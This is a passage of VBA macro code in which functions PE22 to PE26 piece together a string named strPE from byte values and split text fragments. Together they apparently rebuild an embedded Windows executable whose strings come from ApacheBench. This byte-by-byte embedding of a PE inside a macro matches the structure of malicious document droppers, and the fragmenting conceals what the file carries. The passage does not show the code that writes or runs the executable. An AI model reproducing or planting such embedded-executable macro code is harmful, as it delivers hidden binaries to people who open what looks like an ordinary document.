    strPE = B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(strPE, "ed out!"), 10), 0), 0), 0), 0), "%s"), 9), "%I64d"), 9), "%I64d"), 9), "%I64d"), 9), "%I64d"), 9), "%I64d"), 10), 0), 0), 0), "st")
    strPE = B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "arttime"), 9), "seconds"), 9), "ctime"), 9), "dtime"), 9), "ttime"), 9), "wait"), 10), 0), 0), 0), "Cannot o")
    strPE = B(A(A(A(A(A(B(A(B(strPE, "pen gnuplot output file"), 0), "%d,%.3f"), 10), 0), 0), 0), 0), "Percentage ser")
    strPE = A(A(A(B(A(B(A(A(A(A(B(strPE, "ved,Time in ms"), 10), 0), 0), 0), "Cannot open CSV output file"), 0), "w"), 0), 0), 0)
    strPE = A(A(B(A(A(B(strPE, "  %d%%  %5I64d"), 10), 0), " 100%%  %5I64d (longest request)"), 10), 0)
    strPE = B(A(A(A(A(B(A(A(strPE, 0), 0), " 0%%  <0> (never)"), 10), 0), 0), 10), "Percentage of the requests ")
    strPE = B(A(A(A(B(strPE, "served within a certain time (ms)"), 10), 0), 0), "Total:      %5")
    strPE = B(A(A(A(A(A(B(strPE, "I64d %5I64d%5I64d"), 10), 0), 0), 0), 0), "Processing: %5I64d %5I64d%5I")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "64d"), 10), 0), 0), 0), 0), "Connect:    %5I64d %5I64d%5I64d"), 10), 0), 0), 0), 0), "      ")
    strPE = B(A(A(A(B(strPE, "        min   avg   max"), 10), 0), 0), "WARNING: The median and ")
    strPE = B(strPE, "mean for the total time are not within a normal de")
    strPE = B(A(B(strPE, "viation"), 10), "        These results are probably not tha")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "t reliable."), 10), 0), 0), 0), 0), 0), 0), 0), 0), "ERROR: The median and mean for")
    strPE = B(A(B(strPE, " the total time are more than twice the standard"), 10), " ")
    strPE = B(strPE, "      deviation apart. These results are NOT relia")
    strPE = B(A(A(B(strPE, "ble."), 10), 0), "WARNING: The median and mean for the waiting")
    strPE = B(A(B(strPE, " time are not within a normal deviation"), 10), "        Th")
    strPE = A(A(A(A(A(A(A(B(strPE, "ese results are probably not that reliable."), 10), 0), 0), 0), 0), 0), 0)
    strPE = B(strPE, "ERROR: The median and mean for the waiting time ar")
    strPE = B(A(B(strPE, "e more than twice the standard"), 10), "       deviation ap")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "art. These results are NOT reliable."), 10), 0), 0), 0), 0), 0), 0), 0), "WARNIN")
    strPE = B(strPE, "G: The median and mean for the processing time are")
    strPE = B(A(B(strPE, " not within a normal deviation"), 10), "        These resul")
    strPE = B(A(A(A(A(B(strPE, "ts are probably not that reliable."), 10), 0), 0), 0), "ERROR: The m")
    strPE = B(strPE, "edian and mean for the processing time are more th")
    strPE = B(A(B(strPE, "an twice the standard"), 10), "       deviation apart. Thes")
    strPE = B(A(A(A(A(A(B(strPE, "e results are NOT reliable."), 10), 0), 0), 0), 0), "WARNING: The media")
    strPE = B(strPE, "n and mean for the initial connection time are not")
    strPE = B(A(B(strPE, " within a normal deviation"), 10), "        These results a")
    strPE = B(A(A(A(A(B(strPE, "re probably not that reliable."), 10), 0), 0), 0), "ERROR: The media")
    strPE = B(strPE, "n and mean for the initial connection time are mor")
    strPE = B(A(B(strPE, "e than twice the standard"), 10), "       deviation apart. ")
    strPE = B(A(A(A(A(A(B(strPE, "These results are NOT reliable."), 10), 0), 0), 0), 0), "Total:      %5")
    strPE = B(A(A(A(B(strPE, "I64d %4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "Waiting:    %5I6")
    strPE = B(A(A(A(B(strPE, "4d %4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "Processing: %5I64d")
    strPE = B(A(A(A(B(strPE, " %4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "Connect:    %5I64d %")
    strPE = B(A(A(A(B(strPE, "4I64d %5.1f %6I64d %7I64d"), 10), 0), 0), "              min  mea")

    PE22 = strPE
End Function

Private Function PE23() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(A(A(A(A(B(strPE, "n[+/-sd] median   max"), 10), 0), 0), 0), 0), 10), "Connection Times (ms)"), 10), 0)
    strPE = B(A(A(A(A(A(B(strPE, "                        %.2f kb/s total"), 10), 0), 0), 0), 0), "      ")
    strPE = B(A(A(B(strPE, "                  %.2f kb/s sent"), 10), 0), "Transfer rate:  ")
    strPE = B(A(A(B(strPE, "        %.2f [Kbytes/sec] received"), 10), 0), "Time per reque")
    strPE = B(strPE, "st:       %.3f [ms] (mean, across all concurrent r")
    strPE = B(A(A(A(A(B(strPE, "equests)"), 10), 0), 0), 0), "Time per request:       %.3f [ms] (mea")
    strPE = A(B(A(A(A(A(B(strPE, "n)"), 10), 0), 0), 0), "Requests per second:    %.2f [#/sec] (mean)"), 10)
    strPE = B(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "HTML transferred:       %I64d bytes"), 10), 0), 0), 0), 0), "Total ")
    strPE = B(A(A(A(B(strPE, "PUT:              %I64d"), 10), 0), 0), "Total POSTed:           ")
    strPE = B(A(A(A(A(A(B(A(A(A(B(strPE, "%I64d"), 10), 0), 0), "Total transferred:      %I64d bytes"), 10), 0), 0), 0), 0), "Ke")
    strPE = B(A(A(B(strPE, "ep-Alive requests:    %d"), 10), 0), "Non-2xx responses:      ")
    strPE = B(A(A(B(A(A(B(strPE, "%d"), 10), 0), "Write errors:           %d"), 10), 0), "   (Connect: %d, R")
    strPE = B(A(A(A(B(strPE, "eceive: %d, Length: %d, Exceptions: %d)"), 10), 0), 0), "Failed r")
    strPE = B(A(A(B(A(A(B(strPE, "equests:        %d"), 10), 0), "Complete requests:      %d"), 10), 0), "Ti")
    strPE = B(A(A(A(A(B(strPE, "me taken for tests:   %.3f seconds"), 10), 0), 0), 0), "Concurrency ")
    strPE = A(A(B(A(A(B(strPE, "Level:      %d"), 10), 0), "Document Length:        %u bytes"), 10), 0)
    strPE = B(A(A(B(A(A(strPE, 0), 0), "Document Path:          %s"), 10), 0), "Server Port:        ")
    strPE = B(A(A(B(A(A(A(A(A(B(strPE, "    %hu"), 10), 0), 0), 0), 0), "Server Hostname:        %s"), 10), 0), "Server Sof")
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "tware:        %s"), 10), 0), 10), 10), 0), 0), "</table>"), 10), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th %")
    strPE = B(strPE, "s>Total:</th><td %s>%5I64d</td><td %s>%5I64d</td><")
    strPE = B(A(A(A(A(B(strPE, "td %s>%5I64d</td></tr>"), 10), 0), 0), 0), "<tr %s><th %s>Processing")
    strPE = B(strPE, ":</th><td %s>%5I64d</td><td %s>%5I64d</td><td %s>%")
    strPE = B(A(A(A(A(A(A(A(B(strPE, "5I64d</td></tr>"), 10), 0), 0), 0), 0), 0), 0), "<tr %s><th %s>Connect:</th><")
    strPE = B(strPE, "td %s>%5I64d</td><td %s>%5I64d</td><td %s>%5I64d</")
    strPE = B(A(A(B(strPE, "td></tr>"), 10), 0), "<tr %s><th %s>&nbsp;</th> <th %s>min</th")
    strPE = B(A(A(B(strPE, ">   <th %s>avg</th>   <th %s>max</th></tr>"), 10), 0), "<tr %s")
    strPE = B(strPE, "><th %s colspan=4>Connnection Times (ms)</th></tr>")
    strPE = B(A(A(A(A(strPE, 10), 0), 0), 0), "<tr %s><td colspan=2 %s>&nbsp;</td><td colspan")
    strPE = B(A(A(A(B(strPE, "=2 %s>%.2f kb/s total</td></tr>"), 10), 0), 0), "<tr %s><td colsp")
    strPE = B(strPE, "an=2 %s>&nbsp;</td><td colspan=2 %s>%.2f kb/s sent")
    strPE = B(A(A(A(A(B(strPE, "</td></tr>"), 10), 0), 0), 0), "<tr %s><th colspan=2 %s>Transfer rat")
    strPE = B(strPE, "e:</th><td colspan=2 %s>%.2f kb/s received</td></t")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "r>"), 10), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Requests per sec")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "ond:</th><td colspan=2 %s>%.2f</td></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), "<t")
    strPE = B(strPE, "r %s><th colspan=2 %s>HTML transferred:</th><td co")
    strPE = B(A(A(A(A(B(strPE, "lspan=2 %s>%I64d bytes</td></tr>"), 10), 0), 0), 0), "<tr %s><th col")
    strPE = B(strPE, "span=2 %s>Total PUT:</th><td colspan=2 %s>%I64d</t")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "d></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Total POST")
    strPE = B(A(A(A(A(A(A(B(strPE, "ed:</th><td colspan=2 %s>%I64d</td></tr>"), 10), 0), 0), 0), 0), 0), "<tr ")
    strPE = B(strPE, "%s><th colspan=2 %s>Total transferred:</th><td col")
    strPE = B(A(A(A(B(strPE, "span=2 %s>%I64d bytes</td></tr>"), 10), 0), 0), "<tr %s><th colsp")
    strPE = B(strPE, "an=2 %s>Keep-Alive requests:</th><td colspan=2 %s>")
    strPE = B(A(A(B(strPE, "%d</td></tr>"), 10), 0), "<tr %s><th colspan=2 %s>Non-2xx resp")
    strPE = B(A(A(A(A(B(strPE, "onses:</th><td colspan=2 %s>%d</td></tr>"), 10), 0), 0), 0), "<tr %s")
    strPE = B(strPE, "><td colspan=4 %s >   (Connect: %d, Length: %d, Ex")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "ceptions: %d)</td></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan")
    strPE = B(strPE, "=2 %s>Failed requests:</th><td colspan=2 %s>%d</td")
    strPE = B(A(A(A(A(A(A(B(strPE, "></tr>"), 10), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Complete reque")
    strPE = B(A(A(A(A(B(strPE, "sts:</th><td colspan=2 %s>%d</td></tr>"), 10), 0), 0), 0), "<tr %s><")

    PE23 = strPE
End Function

Private Function PE24() As String
   Dim strPE As String

    strPE = ""
    strPE = B(strPE, "th colspan=2 %s>Time taken for tests:</th><td cols")
    strPE = B(A(A(A(A(A(A(A(B(strPE, "pan=2 %s>%.3f seconds</td></tr>"), 10), 0), 0), 0), 0), 0), 0), "<tr %s><th c")
    strPE = B(strPE, "olspan=2 %s>Concurrency Level:</th><td colspan=2 %")
    strPE = B(A(A(A(A(B(strPE, "s>%d</td></tr>"), 10), 0), 0), 0), "<tr %s><th colspan=2 %s>Document")
    strPE = A(A(B(strPE, " Length:</th><td colspan=2 %s>%u bytes</td></tr>"), 10), 0)
    strPE = B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Document Path:</th><")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "td colspan=2 %s>%s</td></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th col")
    strPE = B(strPE, "span=2 %s>Server Port:</th><td colspan=2 %s>%hu</t")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, "d></tr>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "<tr %s><th colspan=2 %s>Server Hos")
    strPE = B(A(A(A(A(A(A(B(strPE, "tname:</th><td colspan=2 %s>%s</td></tr>"), 10), 0), 0), 0), 0), 0), "<tr ")
    strPE = B(strPE, "%s><th colspan=2 %s>Server Software:</th><td colsp")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "an=2 %s>%s</td></tr>"), 10), 0), 10), 10), "<table %s>"), 10), 0), 0), 0), "socket recei")
    strPE = B(A(B(A(A(B(A(A(A(B(strPE, "ve buffer"), 0), 0), 0), "socket send buffer"), 0), 0), "socket nonblock"), 0), "so")
    strPE = B(A(B(A(A(A(B(A(A(B(strPE, "cket"), 0), 0), "Completed %d requests"), 10), 0), 0), "Content-length:"), 0), "Cont")
    strPE = B(A(A(B(A(A(B(A(B(strPE, "ent-Length:"), 0), "keep-alive"), 0), 0), "Keep-Alive"), 0), 0), "LOG: Response ")
    strPE = A(B(A(A(A(A(A(B(strPE, "code = %s"), 10), 0), 0), 0), 0), "WARNING: Response code not 2xx (%s)"), 10)
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "500"), 0), "HTTP"), 0), 0), 0), 0), "Server:"), 0), 13), 10), 13), 10), 0), 0), 0), 0), "LOG: header receiv")
    strPE = B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(strPE, "ed:"), 10), "%s"), 10), 0), 0), 0), "apr_socket_recv"), 0), "</p>"), 10), "<p>"), 10), 0), 0), 0), " Licensed to")
    strPE = B(strPE, " The Apache Software Foundation, http://www.apache")
    strPE = B(A(A(A(A(A(A(A(A(A(B(strPE, ".org/<br>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), " Copyright 1996 Adam Twiss, Zeus")
    strPE = B(A(A(A(B(strPE, " Technology Ltd, http://www.zeustech.net/<br>"), 10), 0), 0), " T")
    strPE = B(strPE, "his is ApacheBench, Version %s <i>&lt;%s&gt;</i><b")
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "r>"), 10), 0), "$Revision: 655654 $"), 0), "<p>"), 10), 0), 0), 0), 0), 0), 0), 0), 0), "Licensed to Th")
    strPE = B(strPE, "e Apache Software Foundation, http://www.apache.or")
    strPE = B(A(A(A(A(A(A(B(strPE, "g/"), 10), 0), 0), 0), 0), 0), "Copyright 1996 Adam Twiss, Zeus Technology")
    strPE = B(A(A(A(A(B(strPE, " Ltd, http://www.zeustech.net/"), 10), 0), 0), 0), "This is ApacheBe")
    strPE = B(A(A(A(B(A(A(A(A(A(B(strPE, "nch, Version %s"), 10), 0), 0), 0), 0), "2.3 <$Revision: 655654 $>"), 0), 0), 0), "  ")
    strPE = B(strPE, "  -h              Display usage information (this ")
    strPE = B(A(A(A(A(B(strPE, "message)"), 10), 0), 0), 0), "    -r              Don't exit on sock")
    strPE = B(A(A(A(A(B(strPE, "et receive errors."), 10), 0), 0), 0), "    -e filename     Output C")
    strPE = B(A(A(A(A(A(B(strPE, "SV file with percentages served"), 10), 0), 0), 0), 0), "    -g filenam")
    strPE = B(strPE, "e     Output collected data to gnuplot format file")
    strPE = B(A(A(A(A(A(A(A(B(strPE, "."), 10), 0), 0), 0), 0), 0), 0), "    -S              Do not show confidence")
    strPE = B(A(A(A(A(A(B(strPE, " estimators and warnings."), 10), 0), 0), 0), 0), "    -d              ")
    strPE = B(A(A(A(B(strPE, "Do not show percentiles served table."), 10), 0), 0), "    -k    ")
    strPE = B(A(A(B(strPE, "          Use HTTP KeepAlive feature"), 10), 0), "    -V      ")
    strPE = B(A(A(A(B(strPE, "        Print version number and exit"), 10), 0), 0), "    -X pro")
    strPE = B(A(A(B(strPE, "xy:port   Proxyserver and port number to use"), 10), 0), "    ")
    strPE = B(strPE, "-P attribute    Add Basic Proxy Authentication, th")
    strPE = B(A(A(A(A(A(A(B(strPE, "e attributes"), 10), 0), 0), 0), 0), 0), "                    are a colon ")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "separated username and password."), 10), 0), 0), 0), 0), 0), 0), 0), "    -A att")
    strPE = B(strPE, "ribute    Add Basic WWW Authentication, the attrib")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "utes"), 10), 0), 0), 0), 0), 0), 0), 0), "                    Inserted after all")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, " normal header lines. (repeatable)"), 10), 0), 0), 0), 0), 0), 0), 0), "    -H a")
    strPE = B(strPE, "ttribute    Add Arbitrary header line, eg. 'Accept")
    strPE = B(A(A(A(A(A(A(B(strPE, "-Encoding: gzip'"), 10), 0), 0), 0), 0), 0), "    -C attribute    Add cook")
    strPE = B(A(A(B(strPE, "ie, eg. 'Apache=1234. (repeatable)"), 10), 0), "    -z attribu")
    strPE = A(A(A(A(A(B(strPE, "tes   String to insert as td or th attributes"), 10), 0), 0), 0), 0)
    strPE = B(strPE, "    -y attributes   String to insert as tr attribu")

    PE24 = strPE
End Function

Private Function PE25() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(B(strPE, "tes"), 10), 0), 0), "    -x attributes   String to insert as tabl")
    strPE = B(A(A(A(A(B(strPE, "e attributes"), 10), 0), 0), 0), "    -i              Use HEAD inste")
    strPE = B(A(A(A(A(A(B(strPE, "ad of GET"), 10), 0), 0), 0), 0), "    -w              Print out result")
    strPE = B(A(A(A(A(B(strPE, "s in HTML tables"), 10), 0), 0), 0), "    -v verbosity    How much t")
    strPE = B(A(A(B(strPE, "roubleshooting info to print"), 10), 0), "                    ")
    strPE = B(A(A(A(A(A(B(strPE, "Default is 'text/plain'"), 10), 0), 0), 0), 0), "                    'a")
    strPE = B(A(A(A(A(A(B(strPE, "pplication/x-www-form-urlencoded'"), 10), 0), 0), 0), 0), "    -T conte")
    strPE = B(A(A(A(A(B(strPE, "nt-type Content-type header for POSTing, eg."), 10), 0), 0), 0), "  ")
    strPE = B(strPE, "  -u putfile      File containing data to PUT. Rem")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "ember also to set -T"), 10), 0), 0), 0), 0), 0), 0), 0), "    -p postfile     Fi")
    strPE = B(strPE, "le containing data to POST. Remember also to set -")
    strPE = B(A(A(A(B(strPE, "T"), 10), 0), 0), "    -b windowsize   Size of TCP send/receive b")
    strPE = B(A(A(A(B(strPE, "uffer, in bytes"), 10), 0), 0), "    -t timelimit    Seconds to m")
    strPE = B(A(A(B(strPE, "ax. wait for responses"), 10), 0), "    -c concurrency  Number")
    strPE = B(A(A(A(A(A(B(strPE, " of multiple requests to make"), 10), 0), 0), 0), 0), "    -n requests ")
    strPE = A(A(B(A(A(A(B(strPE, "    Number of requests to perform"), 10), 0), 0), "Options are:"), 10), 0)
    strPE = B(A(A(strPE, 0), 0), "Usage: %s [options] [http://]hostname[:port]/pat")
    strPE = B(A(A(A(B(A(B(A(A(A(B(strPE, "h"), 10), 0), 0), ":%d"), 0), "SSL not compiled in; no https support"), 10), 0), 0), "ht")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "tps://"), 0), 0), 0), 0), "[%s]"), 0), 0), 0), 0), "http://"), 0), "ab: Could not read POST ")
    strPE = B(A(A(A(B(strPE, "data file: %s"), 10), 0), 0), "ab: Could not allocate POST data b")
    strPE = B(A(A(A(A(A(B(strPE, "uffer"), 10), 0), 0), 0), 0), "ab: Could not stat POST data file (%s): ")
    strPE = B(A(A(B(A(A(B(strPE, "%s"), 10), 0), "ab: Could not open POST data file (%s): %s"), 10), 0), "ap")
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(strPE, "r_global_pool"), 0), "%d.%d%c"), 0), "****"), 0), 0), 0), 0), "%3d%c"), 0), 0), 0), "%3d "), 0), 0), 0), 0), "  - ")
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "KMGTPE"), 0), 0), "%s: illegal option -- %c"), 10), 0), 0), 0), "%s: option")
    strPE = A(A(B(A(A(A(B(strPE, " requires an argument -- %c"), 10), 0), 0), "CommandLineToArgvW"), 0), 0)
    strPE = B(A(A(A(A(B(A(B(A(B(A(A(B(strPE, "apr_initialize"), 0), 0), "0123456789."), 0), "0.0.0.0"), 0), "bogus %p"), 0), 0), 0), 0), "I6")
    strPE = B(A(B(A(A(A(A(B(strPE, "4d"), 0), 0), 0), 0), "No host data of that type was found"), 0), "Host not")
    strPE = B(A(A(A(B(A(A(B(strPE, " found"), 0), 0), "Graceful shutdown in progress"), 0), 0), 0), "WSAStartup")
    strPE = A(A(A(A(B(A(A(A(B(strPE, " not yet called"), 0), 0), 0), "Winsock version out of range"), 0), 0), 0), 0)
    strPE = B(A(A(A(B(strPE, "Network system is unavailable"), 0), 0), 0), "Too many levels of")
    strPE = B(A(A(A(B(A(A(A(B(strPE, " remote in path"), 0), 0), 0), "Stale NFS file handle"), 0), 0), 0), "Disc quo")
    strPE = B(A(A(B(A(A(B(A(B(strPE, "ta exceeded"), 0), "Too many users"), 0), 0), "Too many processes"), 0), 0), "Di")
    strPE = B(A(A(A(A(B(A(B(strPE, "rectory not empty"), 0), "No route to host"), 0), 0), 0), 0), "Host is down")
    strPE = B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "File name too long"), 0), 0), "Too many levels of symboli")
    strPE = B(A(A(B(A(A(A(B(strPE, "c links"), 0), 0), 0), "Connection refused"), 0), 0), "Connection timed out")
    strPE = B(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "Too many references, can't splice"), 0), 0), 0), "Can't send")
    strPE = A(B(A(A(A(A(B(strPE, " after socket shutdown"), 0), 0), 0), 0), "Socket is not connected"), 0)
    strPE = B(A(B(strPE, "Socket is already connected"), 0), "No buffer space availa")
    strPE = B(A(A(A(A(B(A(A(A(B(strPE, "ble"), 0), 0), 0), "Connection reset by peer"), 0), 0), 0), 0), "Software caused ")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "connection abort"), 0), 0), 0), 0), "Net connection reset"), 0), 0), 0), 0), "Networ")
    strPE = B(A(B(A(A(B(strPE, "k is unreachable"), 0), 0), "Network is down"), 0), "Can't assign req")
    strPE = B(A(A(B(A(A(B(strPE, "uested address"), 0), 0), "Address already in use"), 0), 0), "Address fa")
    strPE = B(A(A(A(A(B(strPE, "mily not supported"), 0), 0), 0), 0), "Protocol family not supporte")
    strPE = B(A(A(A(B(A(A(A(B(strPE, "d"), 0), 0), 0), "Operation not supported on socket"), 0), 0), 0), "Socket typ")
    strPE = B(A(A(B(A(A(A(B(strPE, "e not supported"), 0), 0), 0), "Protocol not supported"), 0), 0), "Bad prot")
    strPE = B(A(A(B(A(B(strPE, "ocol option"), 0), "Protocol wrong type for socket"), 0), 0), "Messag")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "e too long"), 0), 0), 0), 0), "Destination address required"), 0), 0), 0), 0), "Sock")
    strPE = B(A(A(B(strPE, "et operation on non-socket"), 0), 0), "Operation already in p")
    strPE = B(A(A(A(B(A(A(A(B(strPE, "rogress"), 0), 0), 0), "Operation now in progress"), 0), 0), 0), "Operation wo")

    PE25 = strPE
End Function

Private Function PE26() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(B(A(A(A(B(strPE, "uld block"), 0), 0), 0), "Too many open sockets"), 0), 0), 0), "Invalid argume")
    strPE = B(A(A(A(B(A(B(A(A(A(A(B(strPE, "nt"), 0), 0), 0), 0), "Bad address"), 0), "Permission denied"), 0), 0), 0), "Bad file num")
    strPE = B(A(B(A(B(strPE, "ber"), 0), "Interrupted system call"), 0), "APR does not understan")
    strPE = A(A(B(A(B(strPE, "d this error code"), 0), "Error string not specified yet"), 0), 0)
    strPE = B(A(A(B(strPE, "passwords do not match"), 0), 0), "This function has not been")
    strPE = B(A(A(A(A(A(B(strPE, " implemented on this platform"), 0), 0), 0), 0), 0), "There is no erro")
    strPE = A(B(strPE, "r, this value signifies an initialized error code"), 0)
    strPE = A(B(A(A(strPE, 0), 0), "Shared memory is implemented using a key system"), 0)
    strPE = B(A(A(A(A(B(strPE, "Shared memory is implemented using files"), 0), 0), 0), 0), "Shared")
    strPE = B(A(A(A(A(B(strPE, " memory is implemented anonymously"), 0), 0), 0), 0), "Could not fi")
    strPE = B(A(A(A(B(strPE, "nd specified socket in poll list."), 0), 0), 0), "End of file fo")
    strPE = B(A(A(A(B(strPE, "und"), 0), 0), 0), "Missing parameter for the specified command ")
    strPE = B(A(B(strPE, "line option"), 0), "Bad character specified on command lin")
    strPE = B(A(B(strPE, "e"), 0), "Partial results are valid but processing is inco")
    strPE = B(A(A(A(B(A(A(B(strPE, "mplete"), 0), 0), "The timeout specified has expired"), 0), 0), 0), "The sp")
    strPE = B(A(A(A(B(strPE, "ecified child process is not done executing"), 0), 0), 0), "The ")
    strPE = B(A(A(A(B(strPE, "specified child process is done executing"), 0), 0), 0), "The sp")
    strPE = B(A(A(A(A(B(strPE, "ecified thread is not detached"), 0), 0), 0), 0), "The specified th")
    strPE = B(A(A(A(A(A(A(A(A(B(strPE, "read is detached"), 0), 0), 0), 0), 0), 0), 0), 0), "Your code just forked, and")
    strPE = B(strPE, " you are currently executing in the parent process")
    strPE = B(A(A(A(A(strPE, 0), 0), 0), 0), "Your code just forked, and you are currently e")
    strPE = B(A(A(B(A(B(strPE, "xecuting in the child process"), 0), "Internal error"), 0), 0), "The ")
    strPE = B(A(A(B(strPE, "process is not recognized."), 0), 0), "The given path contain")
    strPE = B(A(A(A(A(B(strPE, "ed wildcard characters"), 0), 0), 0), 0), "The given path is misfor")
    strPE = B(A(A(B(strPE, "matted or contained invalid characters"), 0), 0), "The given ")
    strPE = B(A(A(B(strPE, "path was above the root path"), 0), 0), "The given path is in")
    strPE = B(A(A(B(A(A(A(A(B(strPE, "complete"), 0), 0), 0), 0), "The given path is relative"), 0), 0), "The given ")
    strPE = B(A(A(B(strPE, "path is absolute"), 0), 0), "The specified network mask is in")
    strPE = B(A(A(A(A(B(A(A(B(strPE, "valid."), 0), 0), "The specified IP address is invalid."), 0), 0), 0), 0), "DS")
    strPE = B(A(B(strPE, "O load failed"), 0), "No shared memory is currently availa")
    strPE = B(A(B(strPE, "ble"), 0), "No thread key structure was provided and one w")
    strPE = B(A(A(B(strPE, "as required."), 0), 0), "No thread was provided and one was r")
    strPE = B(A(A(A(A(B(strPE, "equired."), 0), 0), 0), 0), "No socket was provided and one was req")
    strPE = B(A(A(A(A(B(strPE, "uired."), 0), 0), 0), 0), "No poll structure was provided and one w")
    strPE = B(A(A(A(A(B(strPE, "as required."), 0), 0), 0), 0), "No lock was provided and one was r")
    strPE = B(A(A(B(strPE, "equired."), 0), 0), "No directory was provided and one was re")
    strPE = B(A(B(strPE, "quired."), 0), "No time was provided and one was required.")
    strPE = A(A(A(B(A(A(strPE, 0), 0), "No process was provided and one was required."), 0), 0), 0)
    strPE = B(A(A(B(strPE, "An invalid socket was returned"), 0), 0), "An invalid date ha")
    strPE = B(A(A(A(B(strPE, "s been provided"), 0), 0), 0), "A new pool could not be created.")
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "Unrecognized Win32 error code %d"), 0), 0), 0), 0), "\"), 0), "\"), 0), "?"), 0), "\"), 0), "U"), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(strPE, "N"), 0), "C"), 0), "\"), 0), 0), 0), 0), 0), "\"), 0), "\"), 0), "?"), 0), "\"), 0), 0), 0), 0), 0), "CancelIo"), 0), 0), 0), 0), "GetCompressedFil")
    strPE = B(A(A(B(A(A(B(strPE, "eSizeA"), 0), 0), "GetCompressedFileSizeW"), 0), 0), "ZwQueryInformation")
    strPE = B(A(A(A(B(A(B(A(A(B(strPE, "File"), 0), 0), "GetSecurityInfo"), 0), "GetNamedSecurityInfoA"), 0), 0), 0), "GetN")
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "amedSecurityInfoW"), 0), 0), 0), "U"), 0), "N"), 0), "C"), 0), "\"), 0), 0), 0), 0), 0), "GetEffectiveRights")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "FromAclW"), 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), "ntdll.dll"), 0), 0), 0), "shell32"), 0), "ws2_32"), 0), 0), "mswsock"), 0), "adva")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "pi32"), 0), 0), 0), 0), "kernel32"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE26 = strPE
End Function

Private Function PE27() As String
   Dim strPE As String

    strPE = ""
